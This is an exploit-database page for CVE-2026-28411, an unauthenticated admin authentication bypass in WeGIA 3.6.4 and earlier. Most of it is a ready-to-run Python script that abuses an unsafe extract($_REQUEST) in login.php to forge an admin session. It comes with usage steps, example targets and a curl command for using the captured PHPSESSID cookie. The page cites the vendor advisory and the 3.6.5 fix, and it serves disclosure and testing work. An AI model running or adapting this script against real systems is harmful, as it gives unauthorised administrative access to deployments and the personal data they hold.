---
title: WeGIA < = 3.6.4 Unauthenticated Admin Authentication Bypass
url: https://cxsecurity.com/issue/WLB-2026030014
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2026-03-08
fetch_date: 2026-03-09T04:08:02.598901
---

# WeGIA < = 3.6.4 Unauthenticated Admin Authentication Bypass

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **WeGIA <= 3.6.4 Unauthenticated Admin Authentication Bypass** **2026.03.08**  Credit:  **[Mohammed Idrees Banyamer](https://cxsecurity.com/author/Mohammed%2BIdrees%2BBanyamer/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2026-28411](https://cxsecurity.com/cveshow/CVE-2026-28411/ "Click to see CVE-2026-28411")**  CWE: **[CWE-288 (Authentication Bypass Using an Alternate Path or Channel), CWE-473 (PHP External Variable Modification)](https://cxsecurity.com/cwe/CWE-288%20%28Authentication%20Bypass%20Using%20an%20Alternate%20Path%20or%20Channel%29%2C%20CWE-473%20%28PHP%20External%20Variable%20Modification%29 "Click to see CWE-288 (Authentication Bypass Using an Alternate Path or Channel), CWE-473 (PHP External Variable Modification)")** | |

#!/usr/bin/env python3
# Exploit Title: WeGIA <= 3.6.4 Authentication Bypass to Admin Session
# CVE: CVE-2026-28411
# Date: 2026-02-27
# Exploit Author: Mohammed Idrees Banyamer
# Author Country: Jordan
# Instagram: @banyamer\_security
# Author GitHub:
# Vendor Homepage: https://github.com/LabRedesCefetRJ/WeGIA
# Software Link: https://github.com/LabRedesCefetRJ/WeGIA
# Affected: WeGIA <= 3.6.4
# Tested on: WeGIA 3.6.4
# Category: Webapps
# Platform: PHP
# Exploit Type: Authentication Bypass
# CVSS: 9.8 (Critical)
# CWE: CWE-288, CWE-473
# Description: Unauthenticated admin login bypass via unsafe extract($\_REQUEST) in login.php
# Fixed in: 3.6.5
# Usage:
# python3 exploit.py <target\_url> [--admin-cpf ADMIN\_CPF] [--admin-id ADMIN\_ID]
#
# Examples:
# python3 exploit.py http://192.168.1.100/WeGIA/html/login.php
# python3 exploit.py https://target.com/wegia/html/login.php --admin-cpf admin --admin-id 1
#
# Options:
# --admin-cpf Known or guessed admin CPF/login (default: admin)
# --admin-id Admin user ID to impersonate (default: 1)
#
# Notes:
# - Exploits unsafe extract($\_REQUEST) to overwrite login variables
# - Sets admin session directly without password check
# - After success, returned cookies can be used for full admin access
#
# How to Use
#
# Step 1: Run the script against the target login endpoint
# Step 2: If successful → copy the PHPSESSID cookie
# Step 3: Use cookie in browser or requests to access admin panel
#
print(r"""
╔════════════════════════════════════════════════════════════════════════════════════════════╗
║ ║
║ ▄▄▄▄· ▄▄▄ . ▄▄ • ▄▄▄▄▄ ▄▄▄ ▄▄▄· ▄▄▄· ▄▄▄▄▄▄▄▄▄ .▄▄▄ ▄• ▄▌ ║
║ ▐█ ▀█▪▀▄.▀·▐█ ▀ ▪•██ ▪ ▀▄ █·▐█ ▀█ ▐█ ▄█•██ ▀▀▄.▀·▀▄ █·█▪██▌ ║
║ ▐█▀▀█▄▐▀▀▪▄▄█ ▀█ ▐█.▪ ▄█▀▄ ▐▀▀▄ ▄█▀▀█ ██▀· ▐█.▪▐▀▀▪▄▐▀▀▄ █▌▐█· ║
║ ██▄▪▐█▐█▄▄▌▐█▄▪▐█ ▐█▌·▐█▌.▐▌▐█•█▌▐█ ▪▐▌▐█▪·• ▐█▌·▐█▄▄▌▐█•█▌▐█▄█▌ ║
║ ·▀▀▀▀ ▀▀▀ ·▀▀▀▀ ▀▀▀ ▀█▄▀▪.▀ ▀ ▀ ▀ .▀ ▀▀▀ ▀▀▀ .▀ ▀ ▀▀▀ ║
║ ║
║ b a n y a m e r \_ s e c u r i t y ║
║ ║
║ >>> Silent Hunter • Shadow Presence <<< ║
║ ║
║ Operator : Mohammed Idrees Banyamer Jordan 🇯🇴 ║
║ Handle : @banyamer\_security ║
║ ║
║ CVE-2026-28411 • WeGIA Auth Bypass ║
║ ║
╚════════════════════════════════════════════════════════════════════════════════════════════╝
""")
import argparse
import requests
import sys
from urllib.parse import urljoin
def exploit(target\_url, admin\_cpf="admin", admin\_id="1"):
session = requests.Session()
login\_url = urljoin(target\_url.rstrip('/') + '/', "login.php")
payload = {
"cpf": admin\_cpf,
"c": "true",
"id\_pessoa": admin\_id,
}
print(f"[\*] Targeting: {login\_url}")
print(f"[\*] Using payload: cpf={admin\_cpf}, c=true, id\_pessoa={admin\_id}")
try:
response = session.post(
login\_url,
data=payload,
allow\_redirects=False,
timeout=10
)
print(f"[\*] Status code: {response.status\_code}")
if response.status\_code in (301, 302):
location = response.headers.get("Location", "N/A")
cookies = session.cookies.get\_dict()
print("[+] SUCCESS: Authentication bypass appears successful")
print(f" Redirect: {location}")
print(f" Cookies set: {cookies}")
if "PHPSESSID" in cookies:
print("\n[+] Admin session cookie obtained!")
print(" PHPSESSID =", cookies["PHPSESSID"])
print("\nNext step: Use this cookie to access the admin panel:")
print(f" Cookie: PHPSESSID={cookies['PHPSESSID']}")
print(f" Example curl:")
print(f" curl -b \"PHPSESSID={cookies['PHPSESSID']}\" {urljoin(target\_url.rstrip('/') + '/', 'index.php')}")
else:
print("[-] Failed to bypass authentication")
print(f" Response snippet:\n{response.text[:400]}...")
except requests.RequestException as e:
print(f"[!] Error: {e}")
sys.exit(1)
if \_\_name\_\_ == "\_\_main\_\_":
parser = argparse.ArgumentParser(description="CVE-2026-28411 WeGIA Authentication Bypass Exploit")
parser.add\_argument("target", help="Target base URL (e.g. http://target.com/WeGIA/)")
parser.add\_argument("--admin-cpf", default="admin", help="Admin CPF/login to impersonate")
parser.add\_argument("--admin-id", default="1", help="Admin user ID to set")
args = parser.parse\_args()
exploit(args.target, args.admin\_cpf, args.admin\_id)

**##### References:**

https://github.com/LabRedesCefetRJ/WeGIA/security/advisories/GHSA-g7r9-hxc8-8vh7

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2026030014)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2026**, cxsecurity.com

|  |

Back to Top